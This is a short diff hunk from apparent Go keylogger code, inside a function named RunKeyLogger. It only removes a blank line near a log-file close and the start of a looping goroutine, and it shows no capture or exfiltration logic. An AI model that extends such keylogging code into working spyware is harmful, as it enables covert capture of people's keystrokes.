@@ -19,7 +19,6 @@ func RunKeyLogger() {
 	if err != nil {
 		log.Fatal(err)
 	}
-
 	defer logfile.Close()
 	go func() {
 		for {
